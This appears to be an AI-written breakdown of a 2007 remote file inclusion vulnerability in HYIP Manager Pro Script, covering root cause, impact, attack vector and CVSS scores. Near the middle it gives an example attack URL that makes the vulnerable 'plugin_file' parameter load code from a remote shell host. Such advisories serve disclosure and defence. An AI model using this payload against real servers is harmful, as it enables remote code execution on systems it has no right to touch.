Based on the provided information, here's a breakdown of the vulnerability:

**Root Cause:**

*   The vulnerability is a Remote File Inclusion (RFI) issue present in the HYIP Manager Pro Script.

**Weaknesses/Vulnerabilities:**

*   The script is vulnerable to Remote File Inclusion. Specifically, the `plugin_file` parameter in `inc/libs/Smarty_Compiler.class.php` is vulnerable.
*   The script appears to be directly including a file based on user-supplied input, without adequate sanitization or validation.

**Impact of Exploitation:**

*   **Remote Code Execution (RCE):** By injecting a malicious file from a remote server, an attacker can execute arbitrary code on the server hosting the vulnerable HYIP Manager Pro Script.
*   **Partial Confidentiality Impact:** An attacker can potentially gain access to sensitive data on the server.
*   **Partial Integrity Impact:** An attacker can potentially modify data on the server.
*   **Partial Availability Impact:** An attacker can potentially disrupt the service by causing denial of service.

**Attack Vectors:**

*   The primary attack vector is through a crafted HTTP request targeting the `inc/libs/Smarty_Compiler.class.php` file with a malicious URL provided via the `plugin_file` parameter.
    *   Example: `http://victim/inc/libs/Smarty_Compiler.class.php?plugin_file=http://shell/?`

**Required Attacker Capabilities/Position:**

*   The attacker needs to be able to send HTTP requests to the server hosting the vulnerable script.
*   No authentication is required, making this vulnerability easily exploitable.
*   The attacker needs to have a publicly accessible server to host the malicious file.

**Additional Information:**

*   The vulnerability was reported on 2007.04.28 by hackerz.ir.
*   The affected files are primarily located in the `inc/libs/` directory.

This vulnerability is rated as high risk with a CVSS base score of 7.5, exploitability score of 10, and impact score of 6.4.
